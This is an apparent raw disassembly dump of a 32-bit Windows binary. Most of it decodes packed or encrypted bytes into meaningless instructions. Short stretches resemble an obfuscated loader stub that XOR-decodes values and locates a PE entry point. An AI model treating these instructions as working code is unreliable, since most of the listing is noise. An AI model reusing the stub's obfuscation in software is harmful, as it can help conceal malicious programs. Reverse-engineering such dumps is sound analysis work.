  4180f7:	xchg   ebp,eax
  4180f8:	jmp    0xb430bbdf
  4180fd:	dec    edx
  4180fe:	inc    esi
  4180ff:	mov    esi,0x9d519acb
  418104:	gs xchg esp,eax
  418106:	add    al,0xcb
  418108:	adc    al,0x9f
  41810a:	inc    ebx
  41810b:	les    esp,FWORD PTR [edi-0x40]
  41810e:	push   edi
  41810f:	enter  0x6427,0x55
  418113:	sahf   
  418114:	adc    ecx,DWORD PTR ss:[ecx-0x77]
  418118:	mov    al,BYTE PTR [ebp+edx*1+0x493c137e]
  41811f:	(bad)
  418123:	xchg   ebp,eax
  418124:	push   ecx
  418125:	mov    esi,0x7eb72067
  41812a:	fisub  WORD PTR [ebx]
  41812c:	inc    esp
  41812d:	lahf   
  41812e:	sar    BYTE PTR [ecx+ecx*2+0x1612cae],1
  418135:	ja     0x4181a4
  418137:	or     esp,DWORD PTR [ebp+edi*1+0x3fe9bb18]
  41813e:	pop    edx
  41813f:	push   esp
  418140:	mov    DWORD PTR [eax-0x4],ecx
  418143:	dec    esp
  418144:	in     eax,0xed
  418146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418147:	push   ss
  418148:	sti    
  418149:	fs xor eax,0x494ceae3
  41814f:	inc    esp
  418150:	inc    edx
  418151:	pusha  
  418152:	cmp    dh,ah
  418154:	xor    bh,BYTE PTR [ebx+ecx*4-0x14711bf]
  41815b:	sar    BYTE PTR [edi+0x3c04cb27],0x68
  418162:	mov    ss,edi
  418164:	jno    0x418178
  418166:	hlt    
  418167:	adc    al,0xf
  418169:	arpl   WORD PTR ds:0xbadb4601,si
  41816f:	mov    ebx,0x64efeb66
  418174:	sbb    al,0x7
  418176:	jg     0x418180
  418178:	pop    esi
  418179:	mov    WORD PTR [ecx],ds
  41817b:	sub    eax,0x3669d61e
  418180:	or     eax,0x492d5fc3
  418185:	mov    ds:0x39cb0135,al
  41818a:	mov    eax,0xc732f40
  41818f:	mov    ds:0x50c87c91,al
  418194:	stos   BYTE PTR es:[edi],al
  418195:	cwde   
  418196:	mov    esi,DWORD PTR [ebp+0xc]
  418199:	xor    ecx,eax
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	out    0xf0,al
  4181b9:	mov    edx,DWORD PTR [eax+0x19]
  4181bc:	xor    al,0x7f
  4181be:	js     0x41823b
  4181c0:	jle    0x41823a
  4181c2:	js     0x418199
  4181c4:	js     0x418227
  4181c6:	jmp    0x41821f
  4181c8:	fisubr DWORD PTR [edi+ecx*4]
  4181cb:	dec    edx
  4181cc:	cmc    
  4181cd:	and    dh,BYTE PTR [edi-0x2a]
  4181d0:	rcr    BYTE PTR [ebp-0x50147952],cl
  4181d6:	loopne 0x418223
  4181d8:	mov    ebp,0xe894501b
  4181dd:	cmp    dh,cl
  4181df:	fistp  DWORD PTR [ecx]
  4181e1:	mov    ah,0xce
  4181e3:	push   cs
  4181e4:	loope  0x41825e
  4181e6:	jmp    0xc7ae:0xe6b3e3bc
  4181ed:	sbb    BYTE PTR ds:0x9db9a9db,al
  4181f3:	fnstcw WORD PTR [ebx]
  4181f5:	mov    edi,0xe2b7ff6a
  4181fa:	cwde   
  4181fb:	push   edi
  4181fc:	shl    esp,1
  4181fe:	(bad)  
  4181ff:	mov    ?,WORD PTR [edx-0x79]
  418202:	mov    ah,0xb
  418204:	out    0x3b,eax
  418206:	(bad)  
  418207:	outs   dx,DWORD PTR ds:[esi]
  418208:	bound  edi,QWORD PTR [ecx-0x3f9b6de0]
  41820e:	fist   WORD PTR [ebp-0x6c1f4dd4]
  418214:	stos   BYTE PTR es:[edi],al
  418215:	jmp    eax
  418217:	push   0xffffffc4
  418219:	and    eax,DWORD PTR ds:0xd5778c7a
  41821f:	das    
  418220:	or     edi,edi
  418222:	std    
  418223:	sbb    eax,ecx
  418225:	in     eax,0x8c
  418227:	arpl   WORD PTR [esi],dx
  418229:	dec    esp
  41822a:	dec    ecx
  41822b:	imul   edx,DWORD PTR [edx],0x8595b7fa
  418231:	push   0x8
  418233:	imul   esi,ebx,0x78
  418236:	outs   dx,BYTE PTR ds:[esi]
  418237:	cs popa 
  418239:	xor    BYTE PTR [edi+edx*8],al
  41823c:	pop    ds
  41823d:	ss cs inc ebp
  418240:	mov    eax,ds:0xd5ee68b2
  418245:	out    0x2f,eax
  418247:	inc    edx
  418248:	cmp    dh,BYTE PTR [edi-0x45300600]
  41824e:	iret   
  41824f:	adc    ecx,DWORD PTR [eax+ecx*1]
  418252:	inc    edx
  418253:	loop   0x4182a4
  418255:	cmp    bl,bl
  418257:	jle    0x4182b4
  418259:	ds dec edi
  41825b:	aaa    
  41825c:	pop    es
  41825d:	sbb    al,0xbe
  41825f:	sub    edx,DWORD PTR [ebx-0x18200b3e]
  418265:	cmp    DWORD PTR [ebx],ebx
  418267:	xchg   edx,eax
  418268:	iret   
  418269:	sub    edi,ebx
  41826b:	dec    edi
  41826c:	repnz sub ebp,esp
  41826f:	pop    esi
  418270:	addr16 in eax,dx
  418272:	xor    al,0x99
  418274:	push   ds
  418275:	push   eax
  418276:	add    al,0xa2
  418278:	inc    ebx
  418279:	mov    ebp,0x48b4cdaf
  41827e:	inc    ecx
  41827f:	mov    eax,0xabd974bd
  418284:	push   0x26
  418286:	jmp    0x54e8:0x8abb9fd3
  41828d:	add    al,BYTE PTR ds:[edx-0xa]
  418291:	scas   al,BYTE PTR es:[edi]
  418292:	adc    al,0xa9
  418294:	fld    TBYTE PTR [edx-0x48]
  418297:	push   ds
  418298:	repnz add eax,0x4b61bb0b
  41829e:	or     BYTE PTR [edi-0x3f079343],al
  4182a4:	fsubr  DWORD PTR ds:[eax-0x36]
  4182a8:	add    eax,0xdd5bb837
  4182ad:	adc    ecx,DWORD PTR [esi+ebp*4-0x20]
  4182b1:	dec    esp
  4182b2:	cmp    DWORD PTR [esi-0x69],ebx
  4182b5:	sbb    dh,BYTE PTR [eax+edx*4-0x5343c007]
  4182bc:	mov    edi,0x9b3cd075
  4182c1:	inc    ecx
  4182c2:	xor    esi,ebp
  4182c4:	add    BYTE PTR [ebx],ah
  4182c6:	pusha  
  4182c7:	jb     0x4182a7
  4182c9:	arpl   WORD PTR es:[eax+0x65],di
  4182cd:	int    0xf0
  4182cf:	pop    ss
  4182d0:	mov    edi,0x6939e0a0
  4182d5:	stos   BYTE PTR es:[edi],al
  4182d6:	mul    DWORD PTR [eax-0x62f24778]
  4182dc:	push   eax
  4182dd:	dec    ebx
  4182de:	sbb    al,0xa7
  4182e0:	push   edi
  4182e1:	cmp    eax,0xb299f83f
  4182e6:	repnz test BYTE PTR [edx+0x584f1978],ch
  4182ed:	mov    ds:0xe383ac3f,eax
  4182f2:	push   ebx
  4182f3:	test   al,0x17
  4182f5:	pop    ecx
  4182f6:	cmp    eax,0xab7d77a4
  4182fb:	mov    ecx,DWORD PTR [ecx-0x258b5124]
  418301:	xor    BYTE PTR [edi+0x48],dl
  418304:	pop    ecx
  418305:	cld    
  418306:	sti    
  418307:	adc    al,0x18
  418309:	out    0x45,al
  41830b:	(bad)  
  41830c:	lock int3 
  41830e:	ret    0x69a9
  418311:	cmp    eax,0x912f5f8f
  418316:	add    BYTE PTR [eax+0x1ca97149],bh
  41831c:	xchg   ebp,eax
  41831d:	inc    edx
  41831e:	rcl    DWORD PTR [edx+0x34],0x0
  418322:	pop    ss
  418323:	cmp    dl,BYTE PTR [ebx+0x53b506ed]
  418329:	shl    DWORD PTR [ebx-0x76014948],cl
  41832f:	repnz cdq 
  418331:	ss enter 0x861b,0xb3
  418336:	fisttp QWORD PTR [esi+0x54]
  418339:	loop   0x418394
  41833b:	inc    ebx
  41833c:	push   edi
  41833d:	mov    dh,0x3c
  41833f:	ret    0xaacb
  418342:	shr    al,1
  418344:	test   eax,0x16d7a487
  418349:	fisttp DWORD PTR [edx]
  41834b:	sahf   
  41834c:	cmp    ebx,0xfffffffb
  41834f:	pop    eax
  418350:	push   0xffffffef
  418352:	lods   al,BYTE PTR ds:[esi]
  418353:	loopne 0x4183bf
  418355:	pop    ds
  418356:	daa    
  418357:	pop    ecx
  418358:	in     al,0x63
  41835a:	mov    BYTE PTR [esi-0x38d43f19],al
  418360:	retf   
  418361:	ret    
  418362:	mov    esp,0x8d1e16fd
  418367:	pusha  
  418368:	and    BYTE PTR [esi-0x2261eae5],dl
  41836e:	dec    edx
  41836f:	or     esi,DWORD PTR [edx]
  418371:	shl    DWORD PTR [ebx+0x22],1
  418374:	sub    al,0xcf
  418376:	call   0xf8ee:0xb7875b95
  41837d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41837e:	aad    0x52
  418380:	inc    ebx
  418381:	popa   
  418382:	ins    BYTE PTR es:[edi],dx
  418383:	cmp    al,dh
  418385:	sahf   
  418386:	dec    ebx
  418387:	push   ebp
  418388:	jmp    0x6561f08e
  41838d:	add    ecx,DWORD PTR [edi]
  41838f:	das    
  418390:	rdmsr  
  418392:	rol    BYTE PTR [edx+edi*1],cl
  418395:	dec    ebx
  418396:	jp     0x4183a0
  418398:	cmc    
  418399:	leave  
  41839a:	js     0x41833d
  41839c:	sbb    DWORD PTR [ecx],ebp
  41839e:	xchg   BYTE PTR [ecx],ch
  4183a0:	imul   esi,DWORD PTR [esi+0x62068b65],0x8f5a5922
  4183aa:	xor    eax,0xf960706c
  4183af:	xor    eax,0x11f9f396
  4183b4:	mov    DWORD PTR [ebx],0x872d6550
  4183ba:	pushf  
  4183bb:	in     al,dx
  4183bc:	cwde   
  4183bd:	sbb    eax,0x3b47a31e
  4183c2:	sti    
  4183c3:	mov    dh,0xa4
  4183c5:	cmp    edx,DWORD PTR [edx+0x16]
  4183c8:	jno    0x4183fc
  4183ca:	jne    0x418384
  4183cc:	outs   dx,DWORD PTR ds:[esi]
  4183cd:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4183cf:	add    BYTE PTR [esi],al
  4183d1:	mov    eax,0x73037888
  4183d6:	stc    
  4183d7:	inc    edi
  4183d8:	repz inc edx
  4183da:	and    al,0x34
  4183dc:	retf   0xe00f
  4183df:	fsubp  st(1),st
  4183e1:	jg     0x418455
  4183e3:	hlt    
  4183e4:	stos   BYTE PTR es:[edi],al
  4183e5:	stos   BYTE PTR es:[edi],al
  4183e6:	stc    
  4183e7:	push   ebp
  4183e8:	push   esi
  4183e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183ea:	mov    gs,WORD PTR [edi]
  4183ec:	gs or  ecx,ebx
  4183ef:	add    esp,edi
  4183f1:	mov    al,ds:0xe8dea754
  4183f6:	pop    edx
  4183f7:	clc    
  4183f8:	adc    ch,ah
  4183fa:	das    
  4183fb:	push   ds
  4183fc:	pop    ss
  4183fd:	stos   BYTE PTR es:[edi],al
  4183fe:	repz pop ebp
  418400:	mov    ecx,0x50512917
  418405:	dec    edi
  418406:	jae    0x4183e8
  418408:	iret   
  418409:	pusha  
  41840a:	in     eax,0x39
  41840c:	aaa    
  41840d:	adc    ch,BYTE PTR [ebx]
  41840f:	(bad)  
  418410:	into   
  418411:	imul   esi,DWORD PTR [ebp+0x59],0x30aa607e
  418418:	xchg   ecx,eax
  418419:	sub    al,0x2
  41841b:	ss jge 0x418435
  41841e:	loop   0x4183c4
  418420:	rol    ecx,cl
  418422:	(bad)  
  418423:	fcom   QWORD PTR [ebp+0x46]
  418426:	sti    
  418427:	fbstp  TBYTE PTR [ebp-0x2f98f5cf]
  41842d:	jns    0x418463
  41842f:	pop    ebx
  418430:	mov    ds:0xdc984f07,al
  418435:	xor    edi,DWORD PTR [ebx]
  418437:	jl     0x4183bb
  418439:	out    0x42,eax
  41843b:	xchg   bh,dh
  41843d:	mov    dh,0x54
  41843f:	outs   dx,BYTE PTR ds:[esi]
  418440:	add    eax,0x668042d4
  418445:	ja     0x41844b
  418447:	out    0xd,eax
  418449:	shl    BYTE PTR [edi+0x43],cl
  41844c:	sub    al,0xe2
  41844e:	(bad)  
  41844f:	mov    edi,0xf6fa5767
  418454:	pushf  
  418455:	dec    eax
  418456:	sub    BYTE PTR [edi+edx*2-0x4b],ch
  41845a:	xchg   esi,eax
  41845b:	mov    edx,0x58abe845
  418460:	pop    es
  418461:	push   ecx
  418462:	xchg   ebp,eax
  418463:	sub    al,0xaa
  418465:	arpl   WORD PTR [esi-0x28],bx
  418468:	pop    esi
  418469:	arpl   ax,ax
  41846b:	mov    dl,0x40
  41846d:	xchg   ebx,eax
  41846e:	mov    ds:0x5541dc8b,al
  418473:	push   eax
  418474:	dec    ebx
  418475:	mov    DWORD PTR ss:0x5a9e68d1,edx
  41847c:	out    0xa6,al
  41847e:	mov    dh,0xe6
  418480:	fnsave [edi+0x68f5e227]
  418486:	add    edx,esp
  418488:	in     al,0x31
  41848a:	jo     0x418451
  41848c:	(bad)  
  41848d:	(bad)
  418492:	sub    al,0x34
  418494:	add    eax,0x5418d557
  418499:	pop    es
  41849a:	jecxz  0x4184ab
  41849c:	and    DWORD PTR [edi-0x642ac0c6],eax
  4184a2:	mov    ss,WORD PTR [eax+ebp*8+0x205e2992]
  4184a9:	jno    0x418469
  4184ab:	mov    eax,ds:0x54483a3e
  4184b0:	stc    
  4184b1:	sbb    al,0x99
  4184b3:	daa    
  4184b4:	stos   BYTE PTR es:[edi],al
  4184b5:	xchg   ebx,eax
  4184b6:	add    al,0x9c
  4184b8:	sbb    DWORD PTR [ebp-0x520052f9],esp
  4184be:	jmp    0x9c85:0x28f98104
  4184c5:	clc    
  4184c6:	jne    0x417e12
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0xf4ec6d48
  4184e3:	adc    eax,0x3914707e
  4184e8:	jg     0x418562
  4184ea:	jnp    0x41856a
  4184ec:	js     0x418566
  4184ee:	cmp    DWORD PTR [esi+0x704a03a8],eax
  4184f4:	ins    BYTE PTR es:[edi],dx
  4184f5:	lods   eax,DWORD PTR ds:[esi]
  4184f6:	out    0xa6,eax
  4184f8:	adc    al,BYTE PTR [esi+0x37]
  4184fb:	push   0xffffffbc
  4184fd:	add    cl,BYTE PTR [ecx]
  4184ff:	push   ecx
  418500:	test   eax,0xa689ae39
  418505:	(bad)  
  418506:	pop    ss
  418507:	cmp    BYTE PTR [esi-0x15],ch
  41850a:	add    bl,BYTE PTR [ebx+0x538c3898]
  418510:	call   0xf00c2a09
  418515:	ins    BYTE PTR es:[edi],dx
  418516:	das    
  418517:	add    DWORD PTR [edx+0x25712906],ebp
  41851d:	fs (bad) 
  41851f:	not    DWORD PTR ds:0xf6951652
  418525:	xlat   BYTE PTR ds:[ebx]
  418526:	clc    
  418527:	ficomp DWORD PTR [esi+0x28]
  41852a:	jl     0x418537
  41852c:	call   0x2a5f:0xb126fb75
  418533:	sub    eax,DWORD PTR [eax+0x51a37c0d]
  418539:	adc    DWORD PTR [eax-0x9],ecx
  41853c:	adc    al,0x57
  41853e:	jmp    0x1c789051
  418543:	scas   al,BYTE PTR es:[edi]
  418544:	xchg   esi,eax
  418545:	cli    
  418546:	or     DWORD PTR [eax-0x43d49815],ebx
  41854c:	ret    
  41854d:	add    DWORD PTR [esp+ebx*2-0x36],0x7
  418552:	in     eax,0x2d
  418554:	sub    eax,0xe38aa607
  418559:	enter  0xfc55,0xed
  41855d:	aas    
  41855e:	or     DWORD PTR [ecx],edi
  418560:	mov    esp,gs
  418562:	fwait
  418563:	adc    BYTE PTR ss:[ebx+0x4d983219],cl
  41856a:	xchg   esi,eax
  41856b:	dec    ecx
  41856c:	sub    esi,ecx
  41856e:	dec    esp
  41856f:	out    dx,al
  418570:	add    al,0xcb
  418572:	or     esi,DWORD PTR [eax]
  418574:	push   ebp
  418575:	daa    
  418576:	cmp    esi,DWORD PTR [ecx]
  418578:	retf   
  418579:	inc    esp
  41857a:	mov    bh,0xa7
  41857c:	jmp    0xaa5a:0x4408fc11
  418583:	pusha  
  418584:	cmp    BYTE PTR [ebx-0x4414658c],dh
  41858a:	push   cs
  41858b:	ins    DWORD PTR es:[edi],dx
  41858c:	lods   al,BYTE PTR ds:[esi]
  41858d:	sub    edi,edi
  41858f:	pop    ecx
  418590:	pusha  
  418591:	jge    0x41855a
  418593:	jp     0x418558
  418595:	popa   
  418596:	inc    edx
  418597:	pop    ebp
  418598:	and    esi,DWORD PTR [edx]
  41859a:	mov    cs,WORD PTR [eax+0x4f]
  41859d:	es adc al,0xbc
  4185a0:	ficomp WORD PTR es:0xb8a931e5
  4185a7:	mov    WORD PTR [edi],?
  4185a9:	int    0x8c
  4185ab:	jmp    0x53e8:0xf6c468ac
  4185b2:	stos   BYTE PTR es:[edi],al
  4185b3:	push   eax
  4185b4:	xchg   edx,eax
  4185b5:	mov    ch,0x88
  4185b7:	shl    BYTE PTR [ecx+0x2f],0x94
  4185bb:	xchg   ecx,eax
  4185bc:	das    
  4185bd:	or     al,0x30
  4185bf:	xor    eax,0xd043ee97
  4185c4:	ja     0x41856f
  4185c6:	cli    
  4185c7:	in     al,dx
  4185c8:	xchg   cl,dh
  4185ca:	xor    al,0xa4
  4185cc:	lea    esp,[ecx+eiz*8]
  4185cf:	inc    ecx
  4185d0:	lea    si,[eax-0x47]
  4185d4:	xor    esi,esp
  4185d6:	cmp    edx,0x4d516fe8
  4185dc:	ret    0xea54
  4185df:	mov    dh,0x1a
  4185e1:	ret    0xa636
  4185e4:	rcl    ecx,0x34
  4185e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185e8:	mov    ecx,0x72af73ef
  4185ed:	cmp    ebp,DWORD PTR [edx-0x27]
  4185f0:	xor    DWORD PTR [esi],edi
  4185f2:	enter  0x1ba5,0x5
  4185f6:	mov    dh,0x96
  4185f8:	call   0xf982:0x89be2ad9
  4185ff:	xor    BYTE PTR [ecx-0x2c],al
  418602:	out    0xa2,eax
  418604:	dec    ebx
  418605:	or     dh,BYTE PTR [edx-0x4f]
  418608:	stc    
  418609:	test   BYTE PTR [ebx-0x7b],0x8a
  41860d:	enter  0xbea1,0xe8
  418611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418612:	push   es
  418613:	ror    DWORD PTR [ebp+0x5d],1
  418616:	xchg   ebx,eax
  418617:	pop    ds
  418618:	std    
  418619:	cmp    esi,DWORD PTR [esi]
  41861b:	jo     0x41864b
  41861d:	fmul   QWORD PTR [eax+0x37]
  418620:	mov    al,ds:0x3d1b3237
  418625:	arpl   WORD PTR [ebx-0x4f],sp
  418628:	lods   al,BYTE PTR ds:[esi]
  418629:	add    BYTE PTR [ebx+ebp*8+0x7d],bh
  41862d:	dec    eax
  41862e:	ret    
  41862f:	cmp    eax,0x4fbc3a9a
  418634:	push   0xf285632c
  418639:	(bad)  
  41863a:	xor    DWORD PTR [ebp+0x50c9532f],ebp
  418640:	pusha  
  418641:	sbb    ch,0xc8
  418644:	mov    bl,0x9f
  418646:	inc    ebp
  418647:	imul   DWORD PTR [eax-0x622653ea]
  41864d:	xchg   ebp,eax
  41864e:	scas   eax,DWORD PTR es:[edi]
  41864f:	xchg   ecx,eax
  418650:	mov    dh,0xa3
  418652:	lds    ebp,FWORD PTR [ebx]
  418654:	and    ebp,eax
  418656:	retf   
  418657:	mov    ch,0xa5
  418659:	pop    edx
  41865a:	outs   dx,DWORD PTR ds:[esi]
  41865b:	add    bh,ah
  41865d:	mov    edx,0xaaf0e11
  418662:	jb     0x4186db
  418664:	pop    ds
  418665:	mov    eax,ds:0xf83c95bd
  41866a:	pushf  
  41866b:	push   edx
  41866c:	jnp    0x418638
  41866e:	sbb    ebx,DWORD PTR [ecx-0x1c]
  418671:	xchg   ebp,eax
  418672:	mov    edi,0x4322c9f6
  418677:	cmp    eax,0xf413cfd
  41867c:	mov    edx,0xb9dccf23
  418681:	into   
  418682:	pushf  
  418683:	js     0x418701
  418685:	std    
  418686:	mov    dh,0x5e
  418688:	ja     0x4186eb
  41868a:	xor    ch,ah
  41868c:	movups xmm3,XMMWORD PTR es:[ecx+esi*4-0x5e]
  418692:	xor    BYTE PTR [ecx-0x4],ah
  418695:	xchg   ebx,eax
  418696:	pop    eax
  418697:	add    DWORD PTR [ebp-0x49],ebp
  41869a:	jnp    0x418640
  41869c:	hlt    
  41869d:	push   ebp
  41869e:	or     dl,BYTE PTR [esi+eiz*4+0x7f]
  4186a2:	inc    edi
  4186a3:	xor    al,0x9
  4186a5:	inc    edi
  4186a6:	sub    eax,0xaa94ce2b
  4186ab:	js     0x41864e
  4186ad:	push   ecx
  4186ae:	mov    ch,0x50
  4186b0:	fistp  DWORD PTR [edx-0x4e]
  4186b3:	push   cs
  4186b4:	sub    BYTE PTR [esi+0x56395856],dh
  4186ba:	xlat   BYTE PTR ds:[ebx]
  4186bb:	pop    esi
  4186bc:	les    ebp,FWORD PTR [edx]
  4186be:	mov    esp,0x5801d4be
  4186c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186c4:	hlt    
  4186c5:	mov    DWORD PTR [edx],eax
  4186c7:	jno    0x41867c
  4186c9:	adc    al,0x4b
  4186cb:	jns    0x418738
  4186cd:	repz and DWORD PTR [ebx+0x18],esi
  4186d1:	add    al,0x53
  4186d4:	adc    al,0xc3
  4186d6:	push   edx
  4186d7:	xchg   esp,eax
  4186d8:	lock mov ds:0xf280fcf4,ax
  4186df:	popf   
  4186e0:	mov    ebx,DWORD PTR [ebx]
  4186e2:	inc    ebx
  4186e3:	ret    0xf0c4
  4186e6:	pusha  
  4186e7:	lods   eax,DWORD PTR ds:[esi]
  4186e8:	addr16 aam 0xe5
  4186eb:	jae    0x4186f5
  4186ed:	xor    bh,dh
  4186ef:	push   esi
  4186f0:	dec    ecx
  4186f1:	in     al,0x3e
  4186f3:	loopne 0x4186de
  4186f5:	ja     0x5857dc8d
  4186fb:	adc    edx,esi
  4186fd:	xchg   ebx,eax
  4186fe:	xchg   ebx,eax
  4186ff:	inc    esi
  418700:	push   edx
  418701:	mov    ds:0x790724b8,al
  418706:	jmp    0x418738
  418708:	xchg   edi,eax
  418709:	test   eax,0x89d6d419
  41870e:	push   ebx
  41870f:	inc    ebx
  418710:	mov    al,ds:0x9d7725d5
  418715:	(bad)  
  418716:	or     al,0xa3
  418718:	in     al,0xbc
  41871a:	cmp    esi,0xffffffd6
  41871d:	(bad)  
  41871e:	jne    0x418771
  418720:	adc    eax,0x3242792a
  418725:	stc    
  418726:	in     al,dx
  418727:	mov    esp,0xc1620916
  41872c:	sbb    DWORD PTR [esi],ebp
  41872e:	dec    ecx
  41872f:	fs add al,0x2e
  418732:	cld    
  418733:	add    cl,bl
  418735:	jecxz  0x4186d3
  418737:	xlat   BYTE PTR ds:[ebx]
  418738:	ror    BYTE PTR [esi],1
  41873a:	shl    BYTE PTR [ebp-0x3bc0afb0],0x60
  418741:	mov    ebx,0x4bd5231b
  418746:	(bad)  
  418748:	imul   edx,ebx,0xffffffee
  41874b:	push   0xd8b54d3
  418750:	stos   BYTE PTR es:[edi],al
  418751:	xor    al,BYTE PTR [eax+0xb]
  418754:	fldcw  WORD PTR [edx+ebp*1+0x1fc74fc0]
  41875b:	sbb    BYTE PTR [ebp-0x45],bh
  41875e:	cmc    
  41875f:	mov    ah,0x47
  418761:	push   ebp
  418762:	push   0x93a158cb
  418767:	sub    bh,BYTE PTR [eax+0x41]
  41876a:	cmp    al,0xae
  41876c:	jg     0x418778
  41876e:	jg     0x4187c5
  418770:	mov    ds:0x94d08114,eax
  418775:	div    ecx
  418777:	lods   eax,DWORD PTR ds:[esi]
  418778:	sub    BYTE PTR [ebp+0x4e924dc1],dh
  41877e:	mov    BYTE PTR [eax+eax*8],0xa7
  418782:	or     bh,BYTE PTR [ecx+0x757c47f2]
  418788:	sbb    al,0xee
  41878a:	pop    ecx
  41878b:	jo     0x4187ec
  41878d:	sti    
  41878e:	xor    BYTE PTR [edx],dl
  418790:	mov    dh,0x80
  418792:	inc    edi
  418793:	and    DWORD PTR [ebx+ebp*4-0x76],ecx
  418797:	lods   eax,DWORD PTR ds:[esi]
  418798:	ret    0xc95b
  41879b:	sub    al,BYTE PTR [ebx-0x701fe3ed]
  4187a1:	dec    ebx
  4187a2:	dec    esp
  4187a3:	ins    BYTE PTR es:[edi],dx
  4187a4:	mov    ebx,0x7665e37
  4187a9:	sub    BYTE PTR [ecx-0x48bbbe23],ah
  4187af:	mov    ebx,0x4df3b8c3
  4187b4:	inc    edx
  4187b5:	jg     0x418810
  4187b7:	cwde   
  4187b8:	jp     0x41879b
  4187ba:	leave  
  4187bb:	mov    ah,dh
  4187bd:	stc    
  4187be:	shr    BYTE PTR ds:0x8c76ec69,cl
  4187c4:	mov    al,0x7e
  4187c6:	shr    ah,cl
  4187c8:	mov    ds:0xe51b7432,eax
  4187cd:	popa   
  4187ce:	xor    DWORD PTR [edx+0x6d],esp
  4187d1:	test   DWORD PTR [edx+0x6e],0x1092caf
  4187d8:	push   0x7b
  4187da:	mov    ch,0xbb
  4187dc:	sti    
  4187dd:	popa   
  4187de:	sbb    BYTE PTR [edi],dl
  4187e0:	cmp    cl,dh
  4187e2:	mov    eax,ds:0x3ede6d54
  4187e7:	add    eax,DWORD PTR [edx+0x57]
  4187ea:	mov    edi,0x8d68c181
  4187ef:	int    0xff
  4187f1:	mov    esi,ecx
  4187f3:	xor    esi,eax
  4187f5:	add    esi,DWORD PTR [ebp+0x8]
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0xa7051af2
  41883e:	int    0xb
  418840:	pop    ss
  418841:	ds jg  0x4188bc
  418844:	jnp    0x4188c4
  418846:	js     0x4188c0
  418848:	jns    0x4187e4
  41884a:	ds clc 
  41884c:	adc    edx,DWORD PTR [eax+0x62f0d65b]
  418852:	and    bl,0xc8
  418855:	sub    eax,0xb370bd96
  41885a:	out    dx,eax
  41885b:	mov    BYTE PTR [eax*4-0x618ad909],bh
  418862:	push   eax
  418863:	ds adc eax,0x58d30801
  418869:	aas    
  41886a:	or     eax,0x76cc5e17
  41886f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418870:	dec    ebx
  418871:	jne    0x418826
  418873:	loop   0x4188b2
  418875:	rcl    BYTE PTR [ebp+0x2f],0x43
  418879:	push   ecx
  41887a:	and    bl,BYTE PTR [esi+0x25]
  41887d:	cmp    eax,0x953af52c
  418882:	and    DWORD PTR [edx+0x682358bb],edi
  418888:	dec    BYTE PTR [eax-0x5f6e7e8f]
  41888e:	(bad)  
  41888f:	jmp    0xd105c328
  418894:	fist   WORD PTR [edi]
  418896:	stos   BYTE PTR es:[edi],al
  418897:	mov    ds:0xaf7fc912,eax
  41889c:	jne    0x4188f2
  41889e:	test   al,0xd2
  4188a0:	out    dx,al
  4188a1:	xchg   DWORD PTR [ebx-0x6a],eax
  4188a4:	jge    0x418874
  4188a6:	lods   eax,DWORD PTR ds:[esi]
  4188a7:	mov    edx,0xf1552dfc
  4188ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188ad:	jg     0x418875
  4188af:	mov    eax,ds:0x8657f5c7
  4188b4:	ja     0x41886b
  4188b6:	xchg   ebx,eax
  4188b7:	cld    
  4188b8:	in     eax,dx
  4188b9:	(bad)  
  4188bb:	dec    ebx
  4188bc:	test   BYTE PTR [edx+0x4fdd597f],0x0
  4188c3:	dec    ebx
  4188c4:	inc    ebp
  4188c5:	cld    
  4188c6:	leave  
  4188c7:	test   DWORD PTR [esp+eiz*8],ecx
  4188ca:	push   edi
  4188cb:	scas   al,BYTE PTR es:[edi]
  4188cc:	aad    0x35
  4188ce:	arpl   WORD PTR [esp+ecx*4-0x31c0aca9],bp
  4188d5:	jle    0x41894b
  4188d7:	jg     0x4188c3
  4188d9:	mov    ecx,0x7ee0bece
  4188de:	(bad)  
  4188df:	aam    0x82
  4188e1:	push   eax
  4188e2:	xor    ah,BYTE PTR [edi]
  4188e4:	xchg   DWORD PTR [edx+ebx*1+0x6cebd877],ecx
  4188eb:	dec    edi
  4188ec:	sbb    eax,0xc1628cea
  4188f1:	retf   0x9808
  4188f4:	aad    0x7d
  4188f6:	aas    
  4188f7:	xlat   BYTE PTR ds:[ebx]
  4188f8:	and    DWORD PTR [ebx+0x26],edx
  4188fb:	adc    eax,DWORD PTR ds:0x60123977
  418901:	aad    0xa9
  418903:	out    dx,al
  418904:	dec    eax
  418905:	add    eax,0x88354002
  41890a:	and    BYTE PTR [esi],0xb
